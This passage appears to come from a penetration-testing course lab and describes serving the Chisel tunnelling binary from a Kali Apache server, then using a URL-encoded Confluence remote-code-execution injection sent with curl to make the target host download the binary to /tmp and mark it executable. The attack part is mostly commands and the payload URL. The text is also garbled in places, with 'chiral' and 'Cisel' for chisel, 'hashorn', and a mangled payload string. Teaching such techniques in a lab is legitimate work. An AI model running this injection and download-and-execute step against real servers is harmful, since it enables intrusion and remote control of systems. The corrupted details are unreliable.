Our intended client was running a different operating system or architecture, we would have to download the binary for that operating system and architecture from the Cisel Github releases page.940

In this case, both CONFLUENCE01 and our Kali machine are amd64 Linux machines. That means we can simply serve the same chiral binary on our Kali machine, and run it on CONFLUENCE01. We can copy the chiral binary to Apache2 server's webroot directory.

```
kali@kali:~$ sudo cp $(chisel) /var/www/html/
kali@kali:~$ 
```

| Listing 586 - Copying the chiral binary to the Apache2 server loader |

We can then make sure Apache2 is running on our machine.

```
kali@kali:~ sudo systemctl start apache2
[sudo] password for kali:
kali@kali:~$ 
```

| Listing 587 - Starting Apache2 |

Next, we will build the wget command we'll eventually run through our web shell on CONFLUENCE01. This command will download the chiral binary to /tmp/chisel and make it executable.

```
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

| Listing 588 - The Wget payload we use to download the chiral binary to /tmp/chisel on CONFLUENCE01 and make it executable |

Next, we'll format this command to work with curl Confluence injection:

> As before, you can modify the specific parts of the URL-encoded RCE payload that you need to, rather than building a new payload from scratch, to avoid formatting difficulties.

```
kali@kali:~$ curl
http://192.168.50.63:8090/%2B%20java.script.ScriptEngineManager%28%29.getByName%28%22hashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%20%22%20%22%27wget%27%20%20192.168.118.4/chisel%20%2D%20/tmp/chisel%27%29.start%22%22%22%7D/
kali@kali:~$ 
```

| Listing 589 - The wget command executed within our curl Confluence injection command |
